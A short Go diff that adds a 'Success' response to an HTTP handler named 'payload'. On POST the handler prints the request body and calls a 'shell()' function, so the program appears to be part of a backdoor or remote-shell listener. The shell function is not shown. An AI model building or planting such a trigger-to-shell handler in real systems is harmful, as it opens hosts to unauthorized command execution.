@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
 	"os/exec"
@@ -16,6 +17,7 @@ func payload(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
 		result, _ := ioutil.ReadAll(r.Body)
 		fmt.Printf("%s\n", result)
+		_, _ = io.WriteString(w, "Success")
 		shell()
 	}
 }
